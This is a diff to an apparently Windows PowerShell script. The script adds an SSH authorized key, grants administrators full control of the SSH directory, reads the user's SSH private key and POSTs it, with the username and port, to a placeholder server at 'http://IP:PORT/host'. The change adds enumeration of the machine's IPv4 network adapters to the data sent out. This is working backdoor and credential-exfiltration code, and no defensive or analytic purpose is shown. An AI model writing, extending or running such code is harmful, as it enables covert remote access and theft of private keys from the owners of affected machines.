@@ -54,6 +54,14 @@ if (-not (Test-Path -Path $authorizedKeysPath)) {
 Add-Content -Path $authorizedKeysPath -Value (Get-Content -Path $sshKeyPub)
 icacls "$sshDir" /grant:r "Administradores:F" /T /C
 icacls "$authorizedKeysPath" /grant:r "Administradores:F" /C /T
+$adapters = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1' }
+$adapterData = @()
+foreach ($adapter in $adapters) {
+    $adapterData += @{
+        Interface = $adapter.InterfaceAlias
+        IPAddress = $adapter.IPAddress
+    }
+}
 if (Test-Path -Path $sshKey) {
     $privateKey = Get-Content -Path $sshKey -Raw
 } else {
@@ -65,6 +73,7 @@ $postUri = "http://IP:PORT/host"
 $postData = @{
     "Username" = $username
     "PrivateKey" = $privateKey
+    "Adapters" = $adapterData
     "Port" = $port
 } | ConvertTo-Json
 Invoke-RestMethod -Uri $postUri -Method Post -Body $postData -ContentType 'application/json'
